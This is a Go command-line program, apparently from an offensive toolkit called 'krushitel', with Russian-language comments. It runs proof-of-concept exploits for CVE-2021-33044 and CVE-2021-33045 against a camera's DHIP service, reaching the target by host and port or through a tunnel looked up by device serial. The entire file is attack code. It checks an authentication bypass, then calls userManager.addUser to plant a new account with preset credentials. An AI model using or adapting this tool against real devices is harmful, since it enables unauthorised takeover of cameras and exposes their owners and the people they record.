package main

import (
	"context"
	"flag"
	"fmt"
	"net"
	"os"
	"time"

	"krushitel/core/dhip"
	"krushitel/core/exploit/cve_poc"
	"krushitel/core/fwd"
)

type dialer func() (net.Conn, error)

func main() {
	serial := flag.String("serial", "", "серийник: туннель своим стеком fwd")
	host := flag.String("host", "127.0.0.1", "хост без туннеля")
	port := flag.Int("port", 5000, "DHIP-порт камеры")
	user := flag.String("user", "poc33045", "юзер для 33045 addUser")
	pass := flag.String("pass", "Poc33045x", "пароль для 33045 addUser")
	stage := flag.String("stage", "both", "33044 | 33045 | both")
	flag.Parse()

	dhip.LogHook = func(format string, args ...any) {
		fmt.Printf("[DHIP] "+format+"\n", args...)
	}

	var dial dialer
	if *serial != "" {
		fmt.Printf("== туннель по серийнику %s (DHIP %d)...\n", *serial, *port)
		f, err := fwd.Start(*serial, []fwd.PortSpec{{Local: 0, Remote: *port}}, 0, "", "")
		if err != nil {
			fmt.Println("[-] туннель не встал:", err)
			os.Exit(1)
		}
		defer f.Stop()
		p := *port
		dial = func() (net.Conn, error) { return f.DialCamera(p) }
		fmt.Println("[+] туннель ок")
	} else {
		h, p := *host, *port
		dial = func() (net.Conn, error) { return net.DialTimeout("tcp", fmt.Sprintf("%s:%d", h, p), 10*time.Second) }
		fmt.Printf("== цель %s:%d\n", h, p)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()

	if *stage == "both" || *stage == "33044" {
		fmt.Println("\n== CVE-2021-33044: NetKeyboard / Not Used")
		res := cvepoc.TryCVE2021_33044(ctx, dial)
		fmt.Printf("    vulnerable=%v session=%d realm=%q err=%v\n",
			res.Vulnerable, res.Session, res.Realm, res.Err)
	}

	if *stage == "both" || *stage == "33045" {
		fmt.Println("\n== CVE-2021-33045: loopback + userManager.addUser")
		login, pw, ok := dhip.AddUser33045Fanout(dhip.Dialer(dial), *user, *pass)
		fmt.Printf("    ok=%v login=%q pass=%q\n", ok, login, pw)
	}
}
